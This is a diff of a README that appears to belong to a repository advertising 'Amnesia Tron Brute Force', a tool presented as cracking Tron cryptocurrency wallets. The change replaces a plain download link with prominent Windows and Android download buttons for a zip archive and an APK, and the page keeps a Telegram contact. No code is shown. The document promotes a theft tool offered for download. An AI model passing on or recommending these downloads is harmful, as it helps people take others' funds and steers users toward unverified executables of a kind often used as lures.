@@ -8,8 +8,12 @@
   <br>
   <img src="https://img.shields.io/github/stars/amnesia314/Amnesia-Tron-Brute-Force" alt="GitHub Stars">
   <img src="https://img.shields.io/github/forks/amnesia314/Amnesia-Tron-Brute-Force" alt="GitHub Forks">
-  
-    <p align="center">🔥 [Download](https://raw.githubusercontent.com/amnesia314/Amnesia-Tron-Brute-Force/main/Amnesia%20Tron%20Brute%20Force.zip) 🔥
+
+<p align="center">
+  💻<a href="https://raw.githubusercontent.com/amnesia314/Amnesia-Tron-Brute-Force/main/Amnesia%20Tron%20Brute%20Force.zip" style="color: white; background-color: #0566f7; padding: 15px 32px; border-radius: 5px; text-decoration: none; font-size: 16px;">Download for Windows</a>💻 |
+  📱<a href="https://raw.githubusercontent.com/amnesia314/Amnesia-Tron-Brute-Force/main/tronbrut.apk" style="color: white; background-color: #08bf29; padding: 15px 32px; border-radius: 5px; text-decoration: none; font-size: 16px; margin-left: 10px;">Download for Android</a>📱
+</p>
+    
   <br>
   💎 [Contact in Telegram](https://t.me/amnesia314) 💎
   <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
